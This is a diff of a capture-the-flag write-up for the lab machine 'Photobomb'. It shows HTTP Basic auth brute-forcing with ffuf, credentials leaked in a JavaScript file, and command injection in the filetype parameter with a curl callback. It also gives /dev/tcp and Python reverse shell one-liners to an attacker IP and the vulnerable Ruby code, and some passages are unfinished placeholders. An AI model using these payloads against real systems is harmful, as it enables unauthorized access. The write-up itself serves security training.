@@ -139,25 +139,141 @@ Host: photobomb.htb
 Cache-Control: max-age=0
 Authorization: Basic d3E6cXdxdw==
 ```
-A GET request is sent with the header Authorization containing the value of the base64 of "username:password"
+And the server response
+```http
+HTTP/1.1 401 Unauthorized
+Server: nginx/1.18.0 (Ubuntu)
+Date: Wed, 01 Feb 2023 10:45:18 GMT
+Content-Type: text/html
+Content-Length: 590
+Connection: close
+WWW-Authenticate: Basic realm="Admin Area"
+```
+So a GET request is sent with the header Authorization containing the value of the base64 of "username:password". In the server's response, we can see the header 'WWW-Authenticate' which specifies what area of the website we are trying to authenticate to. As its called "Admin Area", we can try to bruteforce the login form with username 'admin'. To do that we write a small script in python that concatenates a list of passwords with the username admin then base64 encodes them and stores them in a file to be used as a payloads file.
 ```python
-with open("/usr/share/wordlists/rockyou.txt","r") as f:
-	with open("./payloads.txt","w") as payloads:
-		i=0
-		while i==0:
-			try:
-				 p = f.readline()
-			except:
-				continue
-			if p!='':
-				try:
-					payloads.write('admin:'+f.readline())
-				except:
-					continue
-			else:
-				i=1
+from base64 import b64encode
+
+with open("/usr/share/wordlists/rockyou.txt","r", errors='ignore') as pass_file:
+	pass_list= pass_file.readlines()
+
+with open('./payloads.txt','w') as payloads:
+	for i in range(len(pass_list)):
+		concat = 'admin:'+pass_list[i]
+		try:
+			encode= b64encode(concat.encode('ascii')).decode('ascii')
+			payloads.write(encode+'\n')
+		except:
+			continue
+```
+We then pass them to ffuf
+```bash
+$ ffuf -w payloads.txt -u http://photobomb.htb/printer -H "Authorization: Basic FUZZ" -fc 401
+```
+We got not results. Re-tried same thing with different username, no result as well.
+After going through the website again I noticed a javascript file that I hadn't checked before
+```js
+function init() {
+  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
+  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
+    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
+  }
+}
+window.onload = init;
+```
+Looking at it closely, we can see that there's a URL that points to the login form alongside what looks like credentials and a comment about tech support. Turns out at last that the credentials are pH0t0:b0Mb!. Looking through http Authorization docs we found that its possible to pass credentials to http Basic Authorization in the URL.
+
+#### Photo Galery and command injection
+Upon logging in we find the following page
+
+![photobomb](imgs/photos.png)
+
+After searhing around ???? so we try download button
+
+```http
+POST /printer HTTP/1.1
+Host: photobomb.htb
+Content-Length: 74
+Cache-Control: max-age=0
+Authorization: Basic cEgwdDA6YjBNYiE=
+Upgrade-Insecure-Requests: 1
+Origin: http://photobomb.htb
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://photobomb.htb/printer
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&filetype=jpg&dimensions=30x20
 ```
 
+Makes POST request with parameters... ???
+Could it be vulnerable ? We decided to test it by doing some input fuzzing
+First we set up a local php server to try and capture anything that our tests output
+```bash
+$ php -S 0.0.0.0:8000                                                        
+[Wed Feb  1 13:28:23 2023] PHP 8.1.12 Development Server (http://0.0.0.0:8000) started
+```
+???After tries it was successful
+
+```http
+POST /printer HTTP/1.1
+Host: photobomb.htb
+Content-Length: 102
+Authorization: Basic cEgwdDA6YjBNYiE=
+Upgrade-Insecure-Requests: 1
+Origin: http://photobomb.htb
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://photobomb.htb/printer
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&filetype=jpg%0acurl%2010.10.14.161:8000/&dimensions=30x20
+```
+We captured it on our local server
+```http
+[Wed Feb  1 13:29:17 2023] 10.10.11.182:57202 Accepted
+[Wed Feb  1 13:29:17 2023] 10.10.11.182:57202 [404]: GET / - No such file or directory
+[Wed Feb  1 13:29:17 2023] 10.10.11.182:57202 Closing
+[Wed Feb  1 13:29:17 2023] 10.10.11.182:57208 Accepted
+[Wed Feb  1 13:29:17 2023] 10.10.11.182:57208 [404]: GET /.jpg - No such file or directory
+[Wed Feb  1 13:29:17 2023] 10.10.11.182:57208 Closing
+```
+Amazing, lets try to get some info out of it before attempting to spawn a reverse shell
+
+```
+[Wed Feb  1 13:45:31 2023] 10.10.11.182:59600 [404]: GET /?wizard - No such file or directory
+[Wed Feb  1 13:46:07 2023] 10.10.11.182:35262 [404]: GET /?/home/wizard/photobomb - No such file or directory
+```
+We can attempt know and spawn a reverse shell. To do that we use [Reverse Shells Generator](https://www.revshells.com/). We tried at first to spawn a shell with bash but it was unsuccessful. So we tried to use python and it worked! We have access now to the machine. 
+```bash
+$ sh -i >& /dev/tcp/10.10.14.112/8000 0>&1
+```
+```python
+$ export RHOST="10.10.14.112";export RPORT=8000;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+```
+whoami
+```bash
+$ whoami
+wizzard
+```
+#### Source code
+I tried looking at the server source code to further understand the reason behind the command injection in ruby
+```ruby
+photo = params[:photo]
+filetype = params[:filetype]
+dimensions = params[:dimensions]
+
+if !File.exists?('resized_images/' + filename)
+  command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resized_images/' + filename
+  puts "Executing: #{command}"
+  system(command)
+```
+Basically, the input retrieved from the post request was not sanitized and was directly concatenated with a shell command that was put in place to resize images. In our injection, we used %0a which decodes to line break. This breaks the command and allows the execution of our payload.
 ---
 ### Post Exploitation
 ---
